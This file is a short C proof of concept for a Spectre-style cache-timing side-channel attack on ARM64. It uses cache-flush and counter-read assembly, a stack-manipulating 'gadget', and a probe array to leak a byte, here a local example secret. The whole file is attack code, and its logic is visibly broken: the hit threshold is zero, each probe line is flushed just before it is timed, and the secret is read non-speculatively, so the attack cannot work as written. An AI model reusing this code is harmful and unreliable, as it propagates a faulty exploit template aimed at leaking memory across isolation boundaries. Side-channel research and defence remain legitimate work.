#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define CACHE_HIT_THRESHOLD 0

void flush(void *p)
{
    asm volatile("dc civac, %0" ::"r"(p));
    asm volatile("dsb ish");
    asm volatile("isb");
}

uint64_t rdtscp()
{
    uint64_t result;
    asm volatile("mrs %0, cntvct_el0"
                 : "=r"(result));
    return result;
}

void gadget()
{
    asm volatile(
        "mov x29, sp\n"
        "ldp x0, xzr, [sp], #16\n"
        "ldp x0, xzr, [sp], #16\n"
        "ldp x0, xzr, [sp], #16\n"
        "nop\n"
        "mov sp, x29\n"
        "dc civac, x29\n"
        "dsb ish\n"
        "isb\n"
        "ret\n");
}

void speculative(char *secret_ptr, volatile char *Array)
{
    char secret;
    size_t temp = 0;

    gadget();

    secret = *secret_ptr;
    temp &= Array[secret * 256];
}

int main()
{
    char secret = 0x42; // Example secret value
    char *secret_address = &secret;
    uint64_t t1, t2;

    volatile char *Array = malloc(256 * 256);
    memset((void *)Array, 0, 256 * 256);

    speculative(secret_address, Array);

    for (size_t i = 1; i < 256; ++i)
    {
        flush(&Array[i * 256]);
        t1 = rdtscp();
        volatile char junk = Array[i * 256];
        t2 = rdtscp();

        if (t2 - t1 < CACHE_HIT_THRESHOLD)
        {
            printf("Possible secret value: 0x%02x\n", (unsigned int)i);
        }
    }

    return 0;
}
